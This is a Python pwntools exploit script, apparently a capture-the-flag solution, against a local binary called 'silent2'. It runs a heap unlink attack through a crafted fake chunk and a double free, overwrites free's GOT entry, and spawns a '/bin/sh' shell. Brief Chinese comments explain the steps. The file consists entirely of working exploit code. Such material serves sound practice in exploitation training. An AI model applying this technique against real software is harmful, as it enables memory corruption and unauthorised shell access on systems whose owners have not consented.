from pwn import *

# context.log_level = 'DEBUG'

p = process('./silent2')

def create(size, content):
    p.sendline('1')
    p.sendline(str(size))
    p.send(content)

def modify(idx, content1, content2):
    p.sendline('3')
    p.sendline(str(idx))
    p.send(content1)
    p.send(content2)

def delete(idx):
    p.sendline('2')
    p.sendline(str(idx))

p.recvuntil('sakura1328\n') # 自己创建的banner.txt文件的内容

func_addr = 0x4009C0
free_got_plt = 0x602018
p_addr = 0x6020D8

create(0x100, 'AAAA')
sleep(0.5)
create(0x100, 'BBBB')
sleep(0.5)
create(0x100, 'CCCC')
sleep(0.5)
create(0x100, 'DDDD')
sleep(0.5)
create(0x100, 'EEEEE')
sleep(0.5)
delete(3)
sleep(0.5)
delete(4)
sleep(0.5)
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(
    0x210 - 0x100) # 构造两个chunk，绕过unlink的检查
create(0x210, payload)
sleep(0.5)
delete(4)  # double free
sleep(0.5)
modify(3, p64(free_got_plt)[0:4], '1111')
sleep(0.5)
modify(0, p64(func_addr)[0:6], '2222')
sleep(0.5)
create(0x100, '/bin/sh\x00')
sleep(0.5)
delete(6)
sleep(0.5)

p.interactive()
